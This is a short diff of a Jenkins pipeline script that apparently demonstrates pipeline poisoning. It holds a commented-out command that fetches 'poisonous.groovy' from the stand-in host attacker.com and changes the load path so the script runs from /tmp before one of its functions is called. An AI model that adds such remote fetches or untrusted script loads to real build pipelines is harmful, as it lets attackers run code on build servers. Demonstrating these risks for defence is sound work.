@@ -1,7 +1,7 @@
 node('ubuntu') {
     def app  
     /// sh "wget attacker.com/poisonous.groovy"
-    def myscript = load 'poisonous.groovy'
+    def myscript = load '/tmp/poisonous.groovy'
     myscript.lookAtThis("Steve")
 
     stage('Start Java Listener') {
